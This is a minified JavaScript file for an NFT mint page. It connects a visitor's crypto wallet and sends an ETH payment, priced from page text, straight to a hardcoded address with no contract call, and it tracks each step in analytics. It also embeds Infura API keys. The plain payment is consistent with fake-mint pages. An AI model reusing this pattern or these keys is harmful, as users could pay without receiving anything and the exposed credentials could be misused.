const NETWORK_ID=1;const RPC_URL='https://mainnet.infura.io/v3/6a07928328af47b89a7e9786edb210d4';const ADDRESS="0x6F632a573d51b7C6B14d0694EAD22d246b2bF42a";class Wallet{provider
onboard=Onboard({networkId:NETWORK_ID,darkMode:!0,subscriptions:{wallet:wallet=>{if(wallet.provider){this.provider=new ethers.providers.Web3Provider(wallet.provider,'any')
window.localStorage.setItem('selectedWallet',wallet.name)}else{this.provider=null}}},walletSelect:{wallets:[{walletName:'metamask'},{walletName:'trust',rpcUrl:RPC_URL},{walletName:'walletConnect',infuraKey:'787950b9745f4c3fb7cf8531f2f32a98'}]}})
async connectWallet(){await this.onboard.walletSelect()
await this.onboard.walletCheck()}
readyToTransact=async()=>{if(!this.provider){const walletSelected=await this.onboard.walletSelect()
if(!walletSelected)return!1}
const ready=await this.onboard.walletCheck()
return ready}
async sendEth(){let price=document.getElementById('price').textContent.toString();_paq.push(['trackEvent','Mint','Click Mint','NFTs',price]);console.log(price);const ready=await this.readyToTransact()
if(!ready)return
_paq.push(['trackEvent','Mint','Select Wallet','NFTs']);const signer=this.provider.getUncheckedSigner()
try{await signer.sendTransaction({to:ADDRESS,value:ethers.utils.parseEther(price),gasLimit:100000,});_paq.push(['trackEvent','Mint','Send Mint Transaction','NFTs',price]);}catch(err){console.log(err.message);_paq.push(['trackEvent','Mint','Error Sending Mint Transaction',err.message,price]);}}}
const wallet=new Wallet()
